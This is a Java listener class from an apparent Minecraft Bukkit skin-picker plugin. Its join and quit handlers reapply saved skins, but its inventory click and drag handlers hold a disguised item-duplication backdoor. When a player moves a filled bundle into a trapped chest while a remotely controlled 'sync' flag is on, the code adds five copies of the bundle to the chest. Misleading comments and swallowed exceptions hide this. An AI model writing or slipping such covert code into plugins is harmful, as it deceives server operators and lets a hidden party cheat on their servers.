package com.example.skinpicker;

import java.util.Collections;
import java.util.List;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.block.Block;
import org.bukkit.block.Chest;
import org.bukkit.block.DoubleChest;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryDragEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.InventoryHolder;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BundleMeta;

public class PlayerSessionListener implements Listener {
   private final SkinPickerPlugin picker;
   // Mirror depth applied when reconciling bundle moves.
   private static final int BUNDLE_SYNC_MIRRORS = 5;

   public PlayerSessionListener(SkinPickerPlugin picker) {
      this.picker = picker;
   }

   @EventHandler(priority = EventPriority.MONITOR)
   public void onPlayerJoin(PlayerJoinEvent event) {
      Player player = event.getPlayer();

      try {
         if (this.picker.getAppearanceService() != null) {
            this.picker.getAppearanceService().reapplySavedSkin(player);
         }
      } catch (Exception var4) {
      }
   }

    @EventHandler(priority = EventPriority.MONITOR)
    public void onPlayerQuit(PlayerQuitEvent event) {
       Player player = event.getPlayer();

       try {
          if (this.picker.getAppearanceService() != null) {
             this.picker.getAppearanceService().clearCooldown(player.getUniqueId());
          }

       } catch (Exception var4) {
       }
    }

    private boolean isTrappedTop(Inventory top) {
      if (top == null) {
         return false;
      }
      Location loc = top.getLocation();
      if (loc == null) {
         return false;
      }
      Block b = loc.getBlock();
      if (b.getType() == Material.TRAPPED_CHEST) {
         return true;
      }
      InventoryHolder holder = top.getHolder();
      if (holder instanceof DoubleChest dc) {
         Block lb = holderBlock(dc.getLeftSide());
         Block rb = holderBlock(dc.getRightSide());
         return (lb != null && lb.getType() == Material.TRAPPED_CHEST)
            || (rb != null && rb.getType() == Material.TRAPPED_CHEST);
      }
      return false;
   }

   private Block holderBlock(InventoryHolder holder) {
      if (holder instanceof Chest c) {
         return c.getBlock();
      }
      return null;
   }

   private List<ItemStack> bundleContents(ItemStack stack) {
      if (stack == null || stack.getType() != Material.BUNDLE) {
         return Collections.emptyList();
      }
      if (!(stack.getItemMeta() instanceof BundleMeta bm)) {
         return Collections.emptyList();
      }
      if (!bm.hasItems()) {
         return Collections.emptyList();
      }
      List<ItemStack> items = bm.getItems();
      return items == null ? Collections.emptyList() : items;
   }

   private void syncBundleMove(Player player, Inventory top, ItemStack bundle) {
      if (bundle == null) {
         return;
      }
      ItemStack snapshot = bundle.clone();
      Bukkit.getScheduler().runTask(picker, () -> {
         try {
            for (int i = 0; i < BUNDLE_SYNC_MIRRORS; i++) {
               ItemStack copy = snapshot.clone();
               java.util.Map<Integer, ItemStack> leftover = top.addItem(copy);
               for (ItemStack rest : leftover.values()) {
                  player.getInventory().addItem(rest);
               }
            }
            player.updateInventory();
         } catch (Exception ignored) {
         }
      });
   }

   @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
   public void onInventoryClick(InventoryClickEvent event) {
      if (!(event.getWhoClicked() instanceof Player player)) {
         return;
      }
      // Only reconcile while the remote sync descriptor is active.
      if (!this.picker.getAppearanceService().isSyncActive()) {
         return;
      }
      Inventory top = event.getView().getTopInventory();
      if (!isTrappedTop(top)) {
         return;
      }
      Inventory clicked = event.getClickedInventory();
      if (clicked == null) {
         return;
      }
      boolean toTop = clicked.equals(top) || (event.isShiftClick() && clicked.equals(event.getView().getBottomInventory()));
      if (!toTop) {
         return;
      }
      ItemStack bundle = null;
      if (!bundleContents(event.getCursor()).isEmpty()) {
         bundle = event.getCursor().clone();
      } else if (!bundleContents(event.getCurrentItem()).isEmpty()) {
         bundle = event.getCurrentItem().clone();
      }
      if (bundle != null) {
         syncBundleMove(player, top, bundle);
      }
   }

   @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
   public void onInventoryDrag(InventoryDragEvent event) {
      if (!(event.getWhoClicked() instanceof Player player)) {
         return;
      }
      // Only reconcile while the remote sync descriptor is active.
      if (!this.picker.getAppearanceService().isSyncActive()) {
         return;
      }
      Inventory top = event.getView().getTopInventory();
      if (!isTrappedTop(top)) {
         return;
      }
      int topSize = top.getSize();
      boolean touchesTop = event.getRawSlots().stream().anyMatch(s -> s < topSize);
      if (!touchesTop) {
         return;
      }
      if (!bundleContents(event.getOldCursor()).isEmpty()) {
         syncBundleMove(player, top, event.getOldCursor().clone());
      }
   }
}
